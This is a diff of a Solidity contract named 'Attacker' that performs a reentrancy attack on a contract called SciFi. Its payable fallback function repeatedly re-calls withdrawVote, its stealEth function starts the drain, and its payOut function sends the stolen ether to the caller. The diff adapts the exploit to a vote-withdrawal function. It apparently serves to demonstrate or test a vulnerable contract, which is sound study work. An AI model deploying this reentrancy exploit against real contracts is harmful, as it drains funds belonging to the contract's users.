@@ -3,38 +3,37 @@ pragma solidity ^0.4.13;
 import "./SciFi.sol";
 
 contract Attacker {
-  event DefaultFunc(address caller, uint amount, uint num, uint daoBalance);
 
   address public scifiAddress;
-  address public transferAddress;
 
-  uint[] public arr;
+  uint voteNo;
   uint public a = 0;
 
   function () payable {
-    DefaultFunc(msg.sender,msg.value,a,SciFi(scifiAddress).getBalance(this)-1);
     while (a<5) {
       a++;
-      arr.push(a);
-      SciFi(scifiAddress).withdraw(this);
+      SciFi(scifiAddress).withdrawVote(voteNo);
     }
   }
 
   //fund contract without calling the default function
   function fundMe() payable {
+
   }
 
   function stealEth(){
-    SciFi(scifiAddress).withdraw(this);
+    SciFi(scifiAddress).withdrawVote(voteNo);
+    resetA();
   }
 
   function payOut() returns (bool){
     if (msg.sender.send(this.balance))
-    return true;
+      return true;
   }
 
   function vote(bytes32 name, uint _amount){
     SciFi(scifiAddress).vote.value(_amount)(name);
+    voteNo = SciFi(scifiAddress).numVotes();
   }
 
   function resetA() {
@@ -43,8 +42,5 @@ contract Attacker {
 
   function setSciFiAddress(address _scifi){
     scifiAddress = _scifi;
-  }
-  function setTransferAddress(address _transferAddress){
-    transferAddress =_transferAddress;
   }
 }
